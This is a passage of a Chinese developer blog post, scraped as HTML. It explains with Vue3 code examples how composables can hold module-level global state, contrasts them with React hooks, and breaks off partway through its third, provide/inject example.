content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue3 组合式函数：能否作为模块级全局状态管理？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4222562141210478/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    三小河
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T06:43:50.000Z" title="Mon Nov 24 2025 06:43:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读15分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在 Vue3 生态中，组合式 API（Composition API）的出现彻底改变了逻辑复用的方式，其中<strong>组合式函数（Composables）</strong>  作为核心载体，不仅能复用组件逻辑，也常被开发者尝试用于全局状态管理。这自然引出一系列疑问：Vue3 的组合式函数能否实现模块级全局状态？其原理与 React 自定义 Hook 有何异同？每次组件引入后内部的响应式状态会重新初始化吗？本文将从 Vue3 的设计理念出发，结合原理、示例与细节，全面解答这些问题。</p>
<h2 data-id="heading-0">一、先明确结论</h2>
<ol>
<li><strong>Vue3 组合式函数可以实现模块级全局状态管理</strong>，且相比 React 自定义 Hook 更 “天然”—— 因为 Vue3 的响应式系统（Proxy）不依赖组件实例，模块级的响应式状态可直接被跨组件共享；</li>
<li>核心原理是<strong>模块作用域 + 响应式状态的闭包缓存</strong>：模块初始化时创建的响应式对象（<code>ref</code>/<code>reactive</code>）会被存储在模块闭包中，所有组件导入并调用组合式函数时，共享同一个响应式实例；</li>
<li>每次组件引入并调用组合式函数时，<strong>内部的响应式状态不会重新初始化</strong>—— 仅函数逻辑会重复执行，但始终返回模块缓存的同一个响应式对象，确保状态全局一致。</li>
</ol>
<h2 data-id="heading-1">二、为什么 Vue3 组合式函数更适合做全局状态？核心原理拆解</h2>
<p>要理解这一点，需先理清 Vue3 的两个关键特性：<strong>模块作用域</strong>和<strong>响应式系统的独立性</strong>，并对比 React 自定义 Hook 的差异。</p>
<h3 data-id="heading-2">1. 模块作用域：状态的 “全局容器”（与 React 一致）</h3>
<p>和 ES6 模块机制相同，Vue3 中每个 <code>.js</code>/<code>.vue</code> 文件都是独立模块，模块内的变量、函数会形成<strong>模块级作用域</strong>：</p>
<ul>
<li>模块被首次导入时，会执行一次初始化逻辑，创建内部变量的实例；</li>
<li>后续所有组件导入该模块时，共享的是同一个模块实例，模块内的变量不会重复创建 —— 这是全局状态能 “共享” 的基础。</li>
</ul>
<h3 data-id="heading-3">2. Vue3 响应式系统：不依赖组件实例（核心差异点）</h3>
<p>这是 Vue3 组合式函数相比 React 自定义 Hook 更适合做全局状态的关键：</p>
<ul>
<li>React 的 <code>useState</code>/<code>useEffect</code> 等 Hook 是<strong>与组件实例强绑定</strong>的，状态存储在组件的 Hook 链表中，若要实现全局共享，必须通过模块闭包 “脱离” 组件实例；</li>
<li>而 Vue3 的 <code>ref</code>/<code>reactive</code> 是<strong>独立于组件实例</strong>的 —— 只要创建了响应式对象，无论在模块内、组件内，其响应式能力都由 Proxy 代理机制保证，无需依赖组件上下文。</li>
</ul>
<p>简单说：Vue3 模块内创建的响应式状态，本身就是 “全局可用” 的，组合式函数只是封装了状态和操作方法，让组件能便捷地访问和修改。</p>
<h3 data-id="heading-4">3. 组合式函数的 “全局化” 本质：闭包缓存响应式实例</h3>
<p>组合式函数实现全局状态的核心逻辑的是：</p>
<ol>
<li>在模块内创建响应式状态（<code>ref</code>/<code>reactive</code>）；</li>
<li>封装修改该状态的方法（如 <code>setUser</code>/<code>logout</code>）；</li>
<li>组合式函数执行时，直接返回模块缓存的响应式状态和方法；</li>
<li>所有组件调用该组合式函数时，拿到的是同一个响应式实例 —— 因此状态变更会同步到所有使用该状态的组件。</li>
</ol>
<p>对比 React 自定义 Hook：Vue3 无需手动维护订阅者（如 <code>subscribers</code> 集合），因为响应式对象本身会触发依赖追踪，组件使用状态时自动成为依赖，状态更新时会自动触发组件重新渲染。</p>
<h2 data-id="heading-5">三、实战示例：用组合式函数实现模块级全局状态</h2>
<p>下面通过 3 个递进示例，从基础实现到通用方案，展示 Vue3 组合式函数的全局状态能力，并验证 “状态不重复初始化” 的特性。</p>
<h3 data-id="heading-6">示例 1：基础版全局状态（共享用户信息）</h3>
<p>需求：实现全局用户状态，支持登录、登出，在多个组件中共享用户信息，状态更新时自动同步渲染。</p>
<h4 data-id="heading-7">步骤 1：定义全局组合式函数（模块级）</h4>
<p>创建 <code>useGlobalUser.js</code> 文件，作为全局状态模块：</p>
<p>javascript</p>
<p>运行</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// useGlobalUser.js（模块级全局状态组合式函数）</span>
<span class="hljs-keyword">import</span> { ref, computed } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;

<span class="hljs-comment">// 模块作用域的响应式状态：闭包缓存，仅初始化一次</span>
<span class="hljs-keyword">const</span> user = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">null</span>); <span class="hljs-comment">// 全局用户状态（ref 确保基本类型响应式）</span>

<span class="hljs-comment">// 计算属性：派生状态（是否登录）</span>
<span class="hljs-keyword">const</span> isLogin = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> !!user.<span class="hljs-property">value</span>);

<span class="hljs-comment">// 操作方法：修改全局状态</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">login</span> = (<span class="hljs-params">userInfo</span>) =&gt; {
  <span class="hljs-comment">// 替换响应式对象的值（ref 通过 .value 访问/修改）</span>
  user.<span class="hljs-property">value</span> = { ...userInfo };
};

<span class="hljs-keyword">const</span> <span class="hljs-title function_">logout</span> = (<span class="hljs-params"/>) =&gt; {
  user.<span class="hljs-property">value</span> = <span class="hljs-literal">null</span>;
};

<span class="hljs-comment">// 组合式函数：供组件调用</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useGlobalUser</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// 直接返回模块缓存的响应式状态和方法（所有组件共享同一实例）</span>
  <span class="hljs-keyword">return</span> {
    user,
    isLogin,
    login,
    logout
  };
}
</code></pre>
<h4 data-id="heading-8">步骤 2：在多个组件中使用该组合式函数</h4>
<p>vue</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- Header.vue 组件 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"header"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Vue3 全局状态示例<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"user-info"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"isLogin"</span>&gt;</span>欢迎 {{ user.name }} <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">v-else</span>&gt;</span>未登录<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"isLogin"</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"logout"</span>&gt;</span>登出<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-comment">// 导入并调用组合式函数</span>
<span class="hljs-keyword">import</span> { useGlobalUser } <span class="hljs-keyword">from</span> <span class="hljs-string">'./useGlobalUser'</span>;
<span class="hljs-keyword">const</span> { user, isLogin, logout } = <span class="hljs-title function_">useGlobalUser</span>();

<span class="hljs-comment">// 验证状态是否共享：组件渲染时打印（仅展示，无实际作用）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Header 组件渲染：'</span>, user.<span class="hljs-property">value</span>);
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>vue</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- Login.vue 组件 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"login"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"handleLogin"</span>&gt;</span>模拟登录（张三）<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { useGlobalUser } <span class="hljs-keyword">from</span> <span class="hljs-string">'./useGlobalUser'</span>;
<span class="hljs-keyword">const</span> { login } = <span class="hljs-title function_">useGlobalUser</span>();

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleLogin</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-comment">// 模拟接口返回的用户信息</span>
  <span class="hljs-title function_">login</span>({ <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'张三'</span>, <span class="hljs-attr">avatar</span>: <span class="hljs-string">'xxx.png'</span> });
};
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>vue</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- App.vue 根组件 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">Header</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">Login</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Header</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./Header.vue'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Login</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./Login.vue'</span>;
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h4 data-id="heading-9">效果验证：</h4>
<ol>
<li>初始状态：Header 显示 “未登录”，控制台打印 <code>Header 组件渲染：null</code>；</li>
<li>点击 “模拟登录”：Login 组件调用 <code>login</code> 修改全局 <code>user</code> 状态；</li>
<li>自动同步：Header 组件因依赖 <code>user</code> 和 <code>isLogin</code>，会自动重新渲染，显示 “欢迎张三”，控制台打印 <code>Header 组件渲染：{ id: 1, name: '张三', ... }</code>；</li>
<li>点击 “登出”：<code>user</code> 状态重置为 <code>null</code>，Header 自动渲染 “未登录”。</li>
</ol>
<h4 data-id="heading-10">核心亮点：</h4>
<ul>
<li>无需手动维护订阅者：Vue3 响应式系统自动追踪依赖，状态更新时关联组件自动重渲染；</li>
<li>代码极简：相比 React 自定义 Hook 省去了 <code>notifySubscribers</code> 和 <code>forceUpdate</code> 逻辑。</li>
</ul>
<h3 data-id="heading-11">示例 2：优化版：支持初始化配置与状态隔离</h3>
<p>基础版仅支持单一状态，优化版可实现：1）初始化时传入默认值；2）通过 <code>key</code> 隔离多组同类状态（如多用户场景）。</p>
<p>javascript</p>
<p>运行</p>
<pre><code class="hljs language-ini" lang="ini">// useGlobalState.js（通用全局状态组合式函数）
import { ref, reactive, isRef, unref } from 'vue'<span class="hljs-comment">;</span>

// 模块缓存：存储不同 key 对应的全局状态
const <span class="hljs-attr">globalStateMap</span> = new Map()<span class="hljs-comment">;</span>
// 模块缓存：存储不同 key 对应的初始化配置
const <span class="hljs-attr">initConfigMap</span> = new Map()<span class="hljs-comment">;</span>

/**
 * 通用全局状态组合式函数
 * @param {string} key - 状态唯一标识（用于隔离不同状态）
 * @param {any} initialValue - 初始值（支持普通值或响应式对象）
 * @returns {<span class="hljs-section">[ref/reactive, function]</span>} - <span class="hljs-section">[状态, 更新函数]</span>
 */
export function useGlobalState(key, initialValue) {
  // 若状态已存在，直接返回缓存的实例
  if (globalStateMap.has(key)) {
    return globalStateMap.get(key)<span class="hljs-comment">;</span>
  }

  // 初始化响应式状态：根据初始值类型选择 ref 或 reactive
  const <span class="hljs-attr">state</span> = isRef(initialValue) 
    ? initialValue 
    : (typeof <span class="hljs-attr">initialValue</span> === <span class="hljs-string">'object'</span> &amp;&amp; initialValue !== null) 
      ? reactive(initialValue) 
      : ref(initialValue)<span class="hljs-comment">;</span>

  // 保存初始化配置（便于后续重置）
  initConfigMap.set(key, initialValue)<span class="hljs-comment">;</span>

  // 更新函数：支持直接赋值或函数式更新
  const <span class="hljs-attr">setState</span> = (updater) =&gt; {
    if (typeof <span class="hljs-attr">updater</span> === <span class="hljs-string">'function'</span>) {
      // 函数式更新：接收当前状态，返回新状态
      const <span class="hljs-attr">newValue</span> = updater(unref(state))<span class="hljs-comment">;</span>
      Object.assign(state, newValue)<span class="hljs-comment">; // reactive 直接合并</span>
      // 若为 ref，直接赋值：<span class="hljs-attr">state.value</span> = newValue
      if (isRef(state)) <span class="hljs-attr">state.value</span> = newValue<span class="hljs-comment">;</span>
    } else {
      // 直接赋值
      Object.assign(state, updater)<span class="hljs-comment">;</span>
      if (isRef(state)) <span class="hljs-attr">state.value</span> = updater<span class="hljs-comment">;</span>
    }
  }<span class="hljs-comment">;</span>

  // 重置函数：恢复到初始值
  const <span class="hljs-attr">resetState</span> = () =&gt; {
    const <span class="hljs-attr">initialValue</span> = initConfigMap.get(key)<span class="hljs-comment">;</span>
    setState(initialValue)<span class="hljs-comment">;</span>
  }<span class="hljs-comment">;</span>

  // 缓存状态和方法（key 作为唯一标识）
  const <span class="hljs-attr">result</span> = [state, setState, resetState]<span class="hljs-comment">;</span>
  globalStateMap.set(key, result)<span class="hljs-comment">;</span>

  return result<span class="hljs-comment">;</span>
}
</code></pre>
<h4 data-id="heading-12">使用方式：多状态隔离与灵活更新</h4>
<p>vue</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 组件A：使用用户状态 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { useGlobalState } <span class="hljs-keyword">from</span> <span class="hljs-string">'./useGlobalState'</span>;

<span class="hljs-comment">// 初始化用户状态（key: 'user'，初始值：null）</span>
<span class="hljs-keyword">const</span> [user, setUser, resetUser] = <span class="hljs-title function_">useGlobalState</span>(<span class="hljs-string">'user'</span>, <span class="hljs-literal">null</span>);

<span class="hljs-comment">// 直接赋值更新</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleLogin</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-title function_">setUser</span>({ <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'张三'</span> });
};

<span class="hljs-comment">// 函数式更新（依赖当前状态）</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">updateName</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-title function_">setUser</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> ({ ...prev, <span class="hljs-attr">name</span>: <span class="hljs-string">'张三-更新'</span> }));
};

<span class="hljs-comment">// 重置到初始值（null）</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleReset</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-title function_">resetUser</span>();
};
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>vue</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 组件B：使用主题状态（与用户状态隔离） --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { useGlobalState } <span class="hljs-keyword">from</span> <span class="hljs-string">'./useGlobalState'</span>;

<span class="hljs-comment">// 初始化主题状态（key: 'theme'，初始值：{ mode: 'light' }）</span>
<span class="hljs-keyword">const</span> [theme, setTheme] = <span class="hljs-title function_">useGlobalState</span>(<span class="hljs-string">'theme'</span>, { <span class="hljs-attr">mode</span>: <span class="hljs-string">'light'</span> });

<span class="hljs-keyword">const</span> <span class="hljs-title function_">toggleTheme</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-title function_">setTheme</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> ({ <span class="hljs-attr">mode</span>: prev.<span class="hljs-property">mode</span> === <span class="hljs-string">'light'</span> ? <span class="hljs-string">'dark'</span> : <span class="hljs-string">'light'</span> }));
};
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>vue</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 组件C：共享用户状态（与组件A共用同一个 state） --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { useGlobalState } <span class="hljs-keyword">from</span> <span class="hljs-string">'./useGlobalState'</span>;

<span class="hljs-comment">// 无需重新初始化，直接获取 key: 'user' 的缓存状态</span>
<span class="hljs-keyword">const</span> [user] = <span class="hljs-title function_">useGlobalState</span>(<span class="hljs-string">'user'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'组件C共享的用户状态：'</span>, user.<span class="hljs-property">value</span>); <span class="hljs-comment">// 与组件A的 user 完全一致</span>
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h4 data-id="heading-13">优化点说明：</h4>
<ul>
<li>支持多状态隔离：通过 <code>key</code> 区分不同全局状态（如 <code>user</code>/<code>theme</code>），避免冲突；</li>
<li>自适应响应式类型：自动根据初始值类型选择 <code>ref</code> 或 <code>reactive</code>，兼容基本类型和对象；</li>
<li>支持函数式更新和重置：满足复杂状态更新场景，便于状态回溯。</li>
</ul>
<h3 data-id="heading-14">示例 3：进阶版：支持异步状态与依赖注入</h3>
<p>在实际开发中，全局状态常需要异步初始化（如从接口获取用户信息），且可能需要通过依赖注入（Provide/Inject）实现跨层级组件共享（避免深层导入）。</p>
<p>javascript</p>
<p>运行</p>
<pre><code class="hljs language-ini" lang="ini">// useGlobalAuth.js（异步+依赖注入的全局状态）
import { ref, computed, provide, inject, onMounted } from 'vue'<span class="hljs-comment">;</span>

// 注入标识（避免命名冲突）
const <span class="hljs-attr">GLOBAL_AUTH_KEY</span> = Symbol(<span class="hljs-string">'GLOBAL_AUTH'</span>)<span class="hljs-comment">;</span>

// 模块级响应式状态（异步初始化）
const <span class="hljs-attr">user</span> = ref(null)<span class="hljs-comment">;</span>
const <span class="hljs-attr">loading</span> = ref(<span class="hljs-literal">true</span>)<span class="hljs-comment">; // 加载状态</span>
const <span class="hljs-attr">error</span> = ref(null)<span class="hljs-comment">; // 错误状态</span>
const <span class="hljs-attr">isLogin</span> = computed(() =&gt; !!user.value)<span class="hljs-comment">;</span>

// 异步初始化：从接口获取用户信息（如刷新页面后恢复登录状态）
const <span class="hljs-attr">fetchUserInfo</span> = async () =&gt; {
  try {
    <span class="hljs-attr">loading.value</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
    // 模拟接口请求
    const <span class="hljs-attr">res</span> = await fetch(<span class="hljs-string">'/api/user/info'</span>)<span class="hljs-comment">;</span>
    const <span class="hljs-attr">data</span> = await res.json()<span class="hljs-comment">;</span>
    <span class="hljs-attr">user.value</span> = data<span class="hljs-comment">;</span>
  } catch (err) {
    <span class="hljs-attr">error.value</span> = err.message<span class="hljs-comment">;</span>
  } finally {
    <span class="hljs-attr">loading.value</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;</span>
  }
}<span class="hljs-comment">;</span>

// 操作方法
const <span class="hljs-attr">login</span> = async (username, password) =&gt; {
  <span class="hljs-attr">loading.value</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
  try {
    const <span class="hljs-attr">res</span> = await fetch(<span class="hljs-string">'/api/login'</span>, {
      method: 'POST',
      body: JSON.stringify({ username, password })
    })<span class="hljs-comment">;</span>
    const <span class="hljs-attr">data</span> = await res.json()<span class="hljs-comment">;</span>
    <span class="hljs-attr">user.value</span> = data.user<span class="hljs-comment">;</span>
    return data<span class="hljs-comment">;</span>
  } catch (err) {
    <span class="hljs-attr">error.value</span> = err.message<span class="hljs-comment">;</span>
    throw err<span class="hljs-comment">;</span>
  } finally {
    <span class="hljs-attr">loading.value</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;</span>
  }
}<span class="hljs-comment">;</span>

const <span class="hljs-attr">logout</span> = async () =&gt; {
  await fetch('/api/logout')<span class="hljs-comment">;</span>
  <span class="hljs-attr">user.value</span> = null<span class="hljs-comment">;</span>
}<span class="hljs-comment">;</span>

// 父组件提供全局状态（如 App.vue 中使用）
export function provideGlobalAuth() {
  // 组件挂载时初始化用户信息
  onMounted(() =&gt; {
    fetchUserInfo()<span class="hljs-comment">;</span>
  })<span class="hljs-comment">;</span>

  // 提供状态和方法（子组件通过 inject 获取）
  provide(GLOBAL_AUTH_KEY, {
    user,
    isLogin,
    loading,
    error,
    login,
    logout
  })<span class="hljs-comment">;</span>
}

// 子组件注入全局状态
export function useGlobalAuth() {
  const <span class="hljs-attr">auth</span> = inject(GLOBAL_AUTH_KEY)<span class="hljs-comment">;</span>
  if (!auth) {
    throw new Error('useGlobalAuth 必须在 provideGlobalAuth 的后代组件中使用')<span class="hljs-comment">;</span>
  }
  return auth<span class="hljs-comment">;</span>
}
</code></pre>
<h4 data-id="heading-15">使用方式：依赖注入跨层级共享</h4>
<p>vue</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- App.vue（根组件提供状态） --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { provideGlobalAuth } <span class="hljs-keyword">from</span> <span class="hljs-string">'./useGlobalAuth'</span>;
<span class="hljs-comment">// 提供全局状态（仅需在根组件调用一次）</span>
<span class="hljs-title function_">provideGlobalAuth</span>();
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">router-view</span> /&gt;</span> <span class="hljs-comment">&lt;!-- 所有子组件均可注入使用 --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
</code></pre>
<p>vue</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 深层子组件（无需导入，直接注入） --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"loading"</span>&gt;</span>加载中...<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-else-if</span>=<span class="hljs-string">"error"</span>&gt;</span>错误：{{ error }}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
